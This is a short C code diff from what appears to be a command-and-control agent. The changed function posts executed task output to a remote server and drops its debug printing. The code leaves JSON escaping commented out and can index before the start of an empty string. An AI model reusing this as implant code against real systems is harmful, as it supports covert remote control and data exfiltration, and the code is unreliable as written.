@@ -27,16 +27,20 @@ void register_agent() {
     }
 }
 
-void send_result(const char *task_id, const char *output) {
+
+void send_result(const char *task_id, char *output) {
+    //char escaped_output[sizeof(output)];
+    //escape_json_string(output, escaped_output, sizeof(output));
+    if (output[strlen(output) - 1] == '\n') {
+        output[strlen(output) - 1] = '\0';
+    }    
     char post_data[2048];
     snprintf(post_data, sizeof(post_data),
              "{\"agent_id\":\"%s\",\"task_id\":\"%s\",\"output\":\"%s\"}",
              agent_id, task_id, output);
-    printf("POST DATA: %s\n", post_data);
     
     char resp[2048] = {0};
     https_post(SERVER, PORT, RESULTS_ENDPOINT, post_data, resp, sizeof(resp));
-    printf("Server response: %s\n", resp);
 }
 
 void poll_and_execute() {
